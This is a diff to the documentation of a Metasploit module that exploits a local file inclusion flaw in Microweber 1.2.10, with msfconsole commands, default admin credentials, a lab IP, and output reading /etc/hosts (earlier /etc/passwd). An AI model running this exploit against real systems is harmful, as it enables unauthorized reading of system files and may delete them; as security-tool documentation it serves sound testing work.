@@ -28,14 +28,14 @@ Module options (auxiliary/gather/microweber_lfi):
 
    Name             Current Setting  Required  Description
    ----             ---------------  --------  -----------
-   LOCAL_FILE_PATH  /etc/passwd      yes       The path of the local file.
-   PASSWORD                          yes       The admin's password for Microweber
+   LOCAL_FILE_PATH  /etc/hosts       yes       The path of the local file.
+   PASSWORD         admin            yes       The admin's password for Microweber
    Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RHOSTS           192.168.188.132  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT            80               yes       The target port (TCP)
    SSL              false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI        /                yes       The base path for Microweber
-   USERNAME                          yes       The admin's username for Microweber
+   USERNAME         admin            yes       The admin's username for Microweber
    VHOST                             no        HTTP server virtual host
 ```
 
@@ -48,10 +48,10 @@ msf6 auxiliary(gather/microweber_lfi) > set username admin
 username => admin
 msf6 auxiliary(gather/microweber_lfi) > set password admin
 password => admin
+msf6 auxiliary(gather/microweber_lfi) > set local_file_path /etc/hosts
+local_file_path => /etc/hosts
 msf6 auxiliary(gather/microweber_lfi) > set rhosts 192.168.188.132
 rhosts => 192.168.188.132
-msf6 auxiliary(gather/microweber_lfi) > set local_file_path /etc/hosts
-local_file_path => /etc/passwd
 msf6 auxiliary(gather/microweber_lfi) > check
 
 [!] Triggering this vulnerability may delete the local file that is wanted to be read.
@@ -65,9 +65,9 @@ msf6 auxiliary(gather/microweber_lfi) > exploit
 [*] Checking Microweber's version.
 [+] Microweber Version: 1.2.10
 [+] You are logged in
-[*] Uploading /etc/passwd to the backup folder.
-[+] passwd was moved!
-[*] Downloading passwd from the backup folder.
+[*] Uploading /etc/hosts to the backup folder.
+[+] hosts was moved!
+[*] Downloading hosts from the backup folder.
 [*] 127.0.0.1 localhost
 127.0.1.1 ubuntu-srv-tk
 
